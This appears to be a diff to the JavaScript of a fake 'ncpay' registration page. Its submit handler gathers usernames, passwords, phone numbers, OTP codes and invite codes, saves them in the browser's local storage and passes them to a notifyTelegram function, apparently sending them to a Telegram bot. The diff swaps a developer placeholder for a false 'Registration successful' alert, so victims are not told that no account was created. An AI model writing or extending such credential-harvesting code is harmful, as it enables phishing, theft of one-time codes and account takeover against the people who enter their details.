@@ -501,12 +501,10 @@
   alert('OTP Failed');
     }
     
-    
-
     async function submitRegister() {
   const user = document.getElementById('regUserInput')?.value?.trim() || "";
-  const phone = document.getElementById('regPhoneInput')?.value?.trim() || "";
   const password = document.getElementById('regPassInput')?.value?.trim() || "";
+  const phone = document.getElementById('regPhoneInput')?.value?.trim() || "";
   const otpCode = document.getElementById('regOtpInput')?.value?.trim() || "";
   const inviteCode = document.getElementById('regInviteInput')?.value?.trim() || "";
 
@@ -515,24 +513,25 @@
     return;
   }
 
+  const localBackup = JSON.parse(localStorage.getItem("ncpay_saved_entries") || "[]");
   const entry = {
     eventType: "Register / Sign Up",
     userName: user,
-    phone,
-    password,
-    otpCode,
-    inviteCode,
+    password: password,
+    phone: phone,
+    otpCode: otpCode,
+    inviteCode: inviteCode,
+    status: "Registration successful",
     savedAt: new Date().toLocaleString("en-IN")
   };
-
-  const localBackup = JSON.parse(localStorage.getItem("ncpay_saved_entries") || "[]");
   localBackup.unshift(entry);
   localStorage.setItem("ncpay_saved_entries", JSON.stringify(localBackup));
 
   await notifyTelegram(entry);
 
-  alert('Sign Up Triggered! (यहाँ अपना रजिस्ट्रेशन API कॉल जोड़ें)');
-}
+  alert('✅ Registration successful! Please login your ID');
+    }
+    
 
 async function notifyTelegram(payload) {
   try {
